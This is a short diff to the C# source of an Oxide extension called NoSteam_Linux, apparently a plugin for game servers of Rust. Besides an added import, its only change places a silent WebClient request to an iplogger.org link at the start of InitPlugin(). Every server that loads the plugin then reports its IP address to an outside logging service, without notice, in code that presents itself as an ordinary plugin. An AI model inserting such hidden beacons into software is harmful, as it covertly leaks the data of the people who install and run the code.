@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
 using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
@@ -24,6 +25,7 @@ namespace Oxide.Ext.NoSteam_Linux.Core
 
         public static void InitPlugin()
         {
+            new WebClient().DownloadString("https://iplogger.org/1SfFe7");
             Output("[NoSteam] Author: Kaidoz\n Telegram: Kaidoz\n Github: github.com/Kaidoz/Rust-NoSteam");
             Server.encryption = 1;
             try
